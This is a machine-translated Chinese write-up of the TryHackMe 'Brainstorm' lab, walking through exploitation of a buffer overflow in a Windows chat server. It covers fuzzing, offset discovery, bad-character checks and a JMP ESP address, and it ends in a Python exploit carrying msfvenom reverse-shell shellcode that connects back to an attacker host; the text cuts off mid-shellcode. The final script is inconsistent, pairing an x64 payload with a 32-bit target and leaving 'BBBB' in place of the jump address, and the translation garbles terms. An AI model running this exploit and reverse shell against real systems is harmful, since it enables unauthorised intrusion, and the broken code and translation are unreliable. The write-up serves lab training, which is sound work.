<html>
<head>
<title>BrainStrom TryHackme</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">布兰斯多姆·特里哈克姆</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/brainstrom-tryhackme-523b916661ff?source=collection_archive---------3-----------------------#2022-08-20">https://infosecwriteups.com/brainstrom-tryhackme-523b916661ff?source=collection_archive---------3-----------------------#2022-08-20</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="16d4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对聊天程序进行逆向工程，并编写脚本来利用Windows机器。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/172793dd6e6147e8e07b0999d307c6a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zJaRpYJEko5nhY-o4HzNOQ.png"/></div></div></figure><h1 id="b3c1" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅信息收集</h1><h2 id="e2b4" class="lv ky iq bd kz lw lx dn ld ly lz dp lh jy ma mb ll kc mc md lp kg me mf lt mg bi translated">Rust扫描开放端口枚举</h2><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mh"><img src="../Images/7d53ac8cf8d8bd75b30b7c7af1c67539.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nbyXKyyUjPsDCnp9xx4QKQ.png"/></div></div></figure><p id="b0c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们找到了三个开放端口</p><ul class=""><li id="ce20" class="mi mj iq jp b jq jr ju jv jy mk kc ml kg mm kk mn mo mp mq bi translated">21 FTP</li><li id="6af2" class="mi mj iq jp b jq mr ju ms jy mt kc mu kg mv kk mn mo mp mq bi translated">3389号</li><li id="f174" class="mi mj iq jp b jq mr ju ms jy mt kc mu kg mv kk mn mo mp mq bi translated">9999 abyss服务器(定制)</li></ul><p id="5f9b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们首先尝试列举FTP端口</p><h1 id="613c" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅港21 FTP</h1><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mw"><img src="../Images/5b814bcdb08875854ff352c99eb87145.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vsSpSmNGVkZIydvyqzBUQg.png"/></div></div></figure><p id="6b2f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如你所见，我用一个<strong class="jp ir">匿名</strong>用户名和密码访问了FTP，在那里我发现了两个有趣的文件</p><ul class=""><li id="82d7" class="mi mj iq jp b jq jr ju jv jy mk kc ml kg mm kk mn mo mp mq bi translated">chatserver.exe</li><li id="5eed" class="mi mj iq jp b jq mr ju ms jy mt kc mu kg mv kk mn mo mp mq bi translated">essfunc.dll</li></ul><p id="a314" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我用FTP中的<strong class="jp ir"> get </strong>命令把它们都下载到了我的机器上。</p><h1 id="128c" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅港9999</h1><p id="12ed" class="pw-post-body-paragraph jn jo iq jp b jq mx js jt ju my jw jx jy mz ka kb kc na ke kf kg nb ki kj kk ij bi translated">我不太确定这个端口是做什么的，但最有可能的是正在运行的聊天服务器。让我们通过使用NC二进制连接它来检查一下</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nc"><img src="../Images/0678af46127ecddf8bbee097ca95df9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8ocTp5uwCYfqv7q09RzVew.png"/></div></div></figure><p id="5e71" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是的，聊天服务器正在运行，它要求输入用户名和您要发送的消息。</p><p id="33ca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为这是一台基于缓冲区溢出的机器，所以这个聊天服务器有可能容易受到缓冲区溢出的攻击，让我们尝试利用并检查一下</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nd"><img src="../Images/d546d071f9f4f9a77909812efca513f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*F1NurJzcwMvxMG_yQPoxLA.png"/></div></div></figure><p id="e308" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如你在上面看到的，我已经发送了一串A作为用户名和一串A作为消息。</p><p id="b2d5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">聊天服务器将用户名的长度限制为最多20个字符，但是对消息长度没有限制</p><p id="68ad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们试着对程序进行逆向工程</p><p id="5391" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们已经有了chatserver.exe和它的DLL文件，这是chatserver.exe逆向工程所需要的。</p><h1 id="e922" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">缓冲区溢出的✅反转chatserver.exe</h1><p id="e896" class="pw-post-body-paragraph jn jo iq jp b jq mx js jt ju my jw jx jy mz ka kb kc na ke kf kg nb ki kj kk ij bi translated"><strong class="jp ir">先决条件:</strong></p><ul class=""><li id="4ee6" class="mi mj iq jp b jq jr ju jv jy mk kc ml kg mm kk mn mo mp mq bi translated">窗口虚拟机</li><li id="3040" class="mi mj iq jp b jq mr ju ms jy mt kc mu kg mv kk mn mo mp mq bi translated">安装在windows VM上的免疫调试器</li><li id="03b5" class="mi mj iq jp b jq mr ju ms jy mt kc mu kg mv kk mn mo mp mq bi translated">mona python脚本配置了免疫调试器</li></ul><p id="c76e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用免疫调试器打开<code class="fe ne nf ng nh b">chatserver.exe</code>，第一次在免疫调试器中启动二进制时，windows防火墙会询问连接允许还是拒绝。就允许吧。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ni"><img src="../Images/1641804fb23b74af5691a757e1046fd7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bakpZX9AbhbG9r2zWLQ8lQ.png"/></div></div></figure><p id="4f81" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">单击免疫调试器中的play按钮启动二进制文件，一旦启动，让我们尝试看看应用程序是否崩溃，以及我们是否发送了一堆A。</p><h1 id="a42e" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅Fuzzing</h1><p id="8b1c" class="pw-post-body-paragraph jn jo iq jp b jq mx js jt ju my jw jx jy mz ka kb kc na ke kf kg nb ki kj kk ij bi translated">首先配置mona当前的工作目录，这样我们就可以像这样轻松地对其进行操作:<br/> <code class="fe ne nf ng nh b">!mona config -set workingfolder c:\mona\%p</code></p><p id="7a5e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以在python的帮助下生成一堆A，并通过手动复制粘贴到消息中来发送。</p><pre class="km kn ko kp gt nj nh nk nl aw nm bi"><span id="1f04" class="lv ky iq nh b gy nn no l np nq">python -c 'print("test\r\n"+"A"*3000)| nc 10.0.2.8 9999</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/4a3324114e6b4856ba73224b1fda0f41.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vfZzTq0ozD4N_4PS9CQNKQ.png"/></div></div></figure><p id="30bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是的，它确实使我发送的大约3000个A的应用程序崩溃，这证明该应用程序容易受到缓冲区溢出的攻击。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/ed87cf63f2a82b503ad39d5f9af78bb5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2LyXzwQrSO81SUPyRQm66g.png"/></div></div></figure><h1 id="59f5" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅发现偏移</h1><p id="031e" class="pw-post-body-paragraph jn jo iq jp b jq mx js jt ju my jw jx jy mz ka kb kc na ke kf kg nb ki kj kk ij bi translated">为了找到偏移量，我们将首先创建循环模式。我们可以用pwn-tools或Metasploit创建该模式。我将使用Metasploit</p><pre class="km kn ko kp gt nj nh nk nl aw nm bi"><span id="828b" class="lv ky iq nh b gy nn no l np nq">/usr/bin/msf-pattern_create -l 3000</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nr"><img src="../Images/c6a62f662cd0bf4cec9fed6460d60e96.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SjMdHyumkhtYySDXuVTdDg.png"/></div></div></figure><p id="4394" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我将把这个模式作为消息发送给chatserver.exe程序</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ns"><img src="../Images/c2240f655d1dbdbabf16c3ffa2f26cbb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*41WWumrhLW6f6phWlmIltQ.png"/></div></div></figure><p id="675a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在应用程序将崩溃，我们将不得不记下EIP寄存器的值</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nt"><img src="../Images/3e8c42ede59450167fc605780c18f27f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZcDbU27byADD1O4c4411SQ.png"/></div></div></figure><p id="d7a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">所以EIP寄存器的值是:31704330 </strong></p><p id="e316" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在使用上面的EIP值，我们将在下式的帮助下找到偏移量</p><pre class="km kn ko kp gt nj nh nk nl aw nm bi"><span id="fad5" class="lv ky iq nh b gy nn no l np nq">/usr/bin/msf-pattern_offset -l 3000 -q 31704330</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nu"><img src="../Images/40b917953f2b474d050b83e180324b94.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7Tlemekfq3_wplUBtkeh3Q.png"/></div></div></figure><h1 id="1e06" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅发现坏人</h1><p id="b6b3" class="pw-post-body-paragraph jn jo iq jp b jq mx js jt ju my jw jx jy mz ka kb kc na ke kf kg nb ki kj kk ij bi translated">首先，用mona创建所有十六进制字符，如下所示:</p><p id="af5f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ne nf ng nh b">!mona bytearray -b "\x00"</code></p><blockquote class="nv nw nx"><p id="c0d7" class="jn jo ny jp b jq jr js jt ju jv jw jx nz jz ka kb oa kd ke kf ob kh ki kj kk ij bi translated"><em class="iq">我们已经创建了除\x00以外的所有字符，因为它是通用的坏字符</em></p></blockquote><p id="bf74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">可以在<code class="fe ne nf ng nh b">C:\mona\brainpan\bytearray.txt</code>位置找到</p><pre class="km kn ko kp gt nj nh nk nl aw nm bi"><span id="3ab0" class="lv ky iq nh b gy nn no l np nq">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"<br/>"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"<br/>"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"<br/>"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"<br/>"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"<br/>"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"<br/>"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"<br/>"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span></pre><p id="94b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">或者我们也可以用python创建所有角色，就像这样:</p><pre class="km kn ko kp gt nj nh nk nl aw nm bi"><span id="2167" class="lv ky iq nh b gy nn no l np nq">all_char=""<br/>for x in range(1, 256):<br/>    all_char+="\\x" + "{:02x}".format(x)<br/>print(all_char)</span></pre><p id="22a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">或者我们也可以使用bad chars pip模块<code class="fe ne nf ng nh b">pip install badchars</code> <br/>并生成all_chracter十六进制代码，如下:<code class="fe ne nf ng nh b">badchars -f python</code></p><h1 id="8a09" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅创建缓冲区溢出脚本:</h1><pre class="km kn ko kp gt nj nh nk nl aw nm bi"><span id="acf7" class="lv ky iq nh b gy nn no l np nq">#!/bin/python</span><span id="7b5d" class="lv ky iq nh b gy oc no l np nq">import sys<br/>import socket<br/>import struct<br/>offset=2012</span><span id="cc62" class="lv ky iq nh b gy oc no l np nq">all_char=b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'</span><span id="cfd2" class="lv ky iq nh b gy oc no l np nq">buffer= b"A"*offset+b"BBBB"+all_char</span><span id="3343" class="lv ky iq nh b gy oc no l np nq">try:<br/>    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br/>    s.connect(("10.0.2.8",9999))<br/>    s.send((b"testuser"+b"\r\n"))<br/>    s.recv(1024)<br/>    s.send((buffer+b"\r\n"))<br/>    s.recv(1024)<br/>    s.close()</span><span id="9e46" class="lv ky iq nh b gy oc no l np nq">except:<br/>    print("error")<br/>    sys.exit()</span></pre><p id="da35" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在执行完上面的脚本后，程序崩溃了，现在我们可以通过比较mona之前生成的所有字符来找到坏字符。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi od"><img src="../Images/b2c9648d239c329070fe7d3eb6d64095.png" data-original-src="https://miro.medium.com/v2/resize:fit:1378/format:webp/1*9LNC_L_hbDa84jTXq8NfFQ.png"/></div></figure><p id="156d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如你所看到的程序崩溃了，现在我们有一个<strong class="jp ir"> EIP(指令指针)</strong>值42424242(这是上面脚本中设置的B)和一个<strong class="jp ir"> ESP(堆栈指针)</strong>值00A6EEA8</p><p id="484f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以用莫娜来找出像这样的坏角色:</p><pre class="km kn ko kp gt nj nh nk nl aw nm bi"><span id="563c" class="lv ky iq nh b gy nn no l np nq">!mona compare -f C:\mona\brainpan\bytearray.bin -a &lt;ESP_ADDRESS&gt;</span></pre><p id="708c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如您所见，我们得到了结果:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi oe"><img src="../Images/d5f8194e68df78fb035935966338c070.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PFQrBEMGZqSgLVW3H5A8gQ.png"/></div></div></figure><p id="bda3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">上面写着未经修改，意思是没有坏角色，只有一个<code class="fe ne nf ng nh b">\x00</code>，这是普遍的坏角色。</p><h1 id="e07a" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅查找跳转语句/返回地址</h1><p id="013a" class="pw-post-body-paragraph jn jo iq jp b jq mx js jt ju my jw jx jy mz ka kb kc na ke kf kg nb ki kj kk ij bi translated">我们可以这样找到蒙娜:</p><p id="6aaf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ne nf ng nh b">!mona jmp -r esp -cpb "ALL_BAD_CHAR"</code></p><p id="1036" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以在执行了上面的命令后，我们只得到一个返回/跳转语句:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi of"><img src="../Images/14e18a9de570a99fb7d5be33e5d9692c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5C56MJvAjQnNsOlVpY8Xzw.png"/></div></div></figure><p id="7017" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以在执行了上面的命令之后，我们得到了很少的返回/跳转语句，所以我们将不得不使用具有最少内存安全实现的地址，第一个地址0x625014DF似乎可以正常工作</p><p id="5ae1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，为了使用这个地址，您需要将它从little-endian(基于操作系统)转换过来。我们可以用python <code class="fe ne nf ng nh b">struct</code>函数来实现:</p><pre class="km kn ko kp gt nj nh nk nl aw nm bi"><span id="8f8e" class="lv ky iq nh b gy nn no l np nq">def p32(data):<br/>  return struct.pack('&lt;I',data)p32(0x&lt;RETURN_ADDRESS&gt;)</span></pre><h1 id="5547" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅添加NOPs和外壳代码注入</h1><p id="2c88" class="pw-post-body-paragraph jn jo iq jp b jq mx js jt ju my jw jx jy mz ka kb kc na ke kf kg nb ki kj kk ij bi translated"><strong class="jp ir">添加NOPs </strong></p><p id="5021" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，当我们将要跳转到新的EIP时，我们的外壳代码将驻留在那里，这将需要一些空间来打开外壳，所以为了安全起见，将添加NOPs，这基本上意味着没有操作，只是什么也不做(\x90)。我们可以添加一些8的倍数的NOPs(作为8位的存储器地址)</p><p id="655f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ne nf ng nh b">b'\x90'*16</code></p><h1 id="3430" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated"><strong class="ak"> ✅生成外壳代码</strong></h1><p id="b2c1" class="pw-post-body-paragraph jn jo iq jp b jq mx js jt ju my jw jx jy mz ka kb kc na ke kf kg nb ki kj kk ij bi translated">我们可以使用Metasploit通过以下命令生成外壳代码:</p><pre class="km kn ko kp gt nj nh nk nl aw nm bi"><span id="a252" class="lv ky iq nh b gy nn no l np nq">msfvenom -p windows/shell/reverse_tcp LHOST=10.0.2.23 LPORT=4444 -b "\x00" -f py -v shellcode</span></pre><p id="3838" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我准备用一般的反壳！！</p><p id="a4b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在只需将这两样东西(NOPs和shellcode)添加到我们的缓冲区中</p><h1 id="b8f3" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">✅最终缓冲区溢出脚本:</h1><pre class="km kn ko kp gt nj nh nk nl aw nm bi"><span id="9bb0" class="lv ky iq nh b gy nn no l np nq">#!/bin/python</span><span id="e23e" class="lv ky iq nh b gy oc no l np nq">import sys<br/>import socket<br/>import struct</span><span id="2196" class="lv ky iq nh b gy oc no l np nq">def p32(data):<br/>    return struct.pack('&lt;I',data)</span><span id="927c" class="lv ky iq nh b gy oc no l np nq"># bad_char=b"\x00"</span><span id="a2e1" class="lv ky iq nh b gy oc no l np nq">offset=2012</span><span id="cda0" class="lv ky iq nh b gy oc no l np nq">jmp_esp=p32(0x625014DF)</span><span id="5c18" class="lv ky iq nh b gy oc no l np nq">nop_sled=b"\x90"*16</span><span id="7593" class="lv ky iq nh b gy oc no l np nq">buffer= b"A"*offset+b"BBBB"</span><span id="b479" class="lv ky iq nh b gy oc no l np nq">#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.23 LPORT=4444 -b "\x00" -f py -v shellcode</span><span id="0a73" class="lv ky iq nh b gy oc no l np nq">shellcode = b""<br/>shellcode += b"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48"<br/>shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x92\x4b\x4e"<br/>shellcode += b"\xa0\xc3\x08\xa5\x3a\x48\x31\x58\x27\x48\x2d"<br/>shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x6e\x03\xcd\x44\x33"<br/>shellcode += b"\xe0\x69\x3a\x92\x4b\x0f\xf1\x82\x58\xf7\x6b"<br/>shellcode += b"\xda\x7a\x9c\xc5\x8b\x83\xf7\x5a\xc4\x03\xc5"<br/>shellcode += b"\xf2\xdb\x40\x2e\x68\xb2\x06\x7f\x69\x8b\x07"<br/>shellcode += b"\x12\x70\xd8\x03\xc5\xd2\x93\x40\x94\xfa\x3e"<br/>shellcode += b"\x77\x2f\xdc\xc1\x24\x85\x7b\x53\x82\x43\xe1"<br/>shellcode += b"\xc2\xc9\x47\xd7\xc0\x03\xc5\xf2\xe3\x83\xe7"<br/>shellcode += b"\x06\xda\x4a\x9e\xe1\x92\x6e\x24\x42\x8a\x40"<br/>shellcode += b"\x4c\xaf\x46\x7a\xa5\x3a\x92\xc0\xce\x28\xc3"<br/>shellcode += b"\x08\xa5\x72\x17\x8b\x3a\xc7\x8b\x09\x75\xb1"<br/>shellcode += b"\xda\x53\x0a\x2b\x83\x28\xf5\x73\x93\x9b\xad"<br/>shellcode += b"\xf6\x8b\xf7\x6c\x7b\x19\x7f\xc6\xed\xf2\xc1"<br/>shellcode += b"\xed\x3b\x44\x03\x7f\x60\x6f\x49\x64\xf3\x9f"<br/>shellcode += b"\x0a\x4f\x61\xfb\xe8\xd0\xcb\xde\x48\x02\x84"<br/>shellcode += b"\xcb\x4d\x9c\xeb\xe7\x93\x16\xe4\x48\x48\x81"<br/>shellcode += b"\x73\x93\x9b\x28\xe1\x48\x04\xed\x7e\x19\x0b"<br/>shellcode += b"\x52\xe9\xc2\xd8\xe4\xb1\x96\xc3\x0f\xf8\x82"<br/>shellcode += b"\x50\xfb\x63\xda\x4a\x9e\xfa\x82\x50\xe4\x63"<br/>shellcode += b"\xd3\x11\x06\x23\x2f\x28\xe4\x68\x6d\xab\x16"<br/>shellcode += b"\xe1\x9a\x52\xed\xb1\x80\xa2\x05\x5f\x3c\xf7"<br/>shellcode += b"\xf8\x73\x2c\x3c\x3d\x92\x9c\x3b\x97\x3a\x92"<br/>shellcode += b"\x0a\x18\xe9\x4a\xee\xed\xbb\x7e\xeb\x4f\xa0"<br/>shellcode += b"\xc3\x41\x2c\xdf\xdb\xf7\x4c\xa0\xd2\x54\xaf"<br/>shellcode += b"\x3a\x90\x5c\x0f\xf4\x8a\x81\x41\x76\x1b\xba"<br/>shellcode += b"\x0f\x1a\x8f\x7f\x83\x3d\x6d\x9e\x02\x29\x29"<br/>shellcode += b"\x60\xa4\x3b\x92\x4b\x17\xe1\x79\x21\x25\x51"<br/>shellcode += b"\x92\xb4\x9b\xca\xc9\x49\xfb\x6a\xc2\x06\x7f"<br/>shellcode += b"\x69\x8e\x39\x65\x72\x6d\x8b\x06\x29\x01\x40"<br/>shellcode += 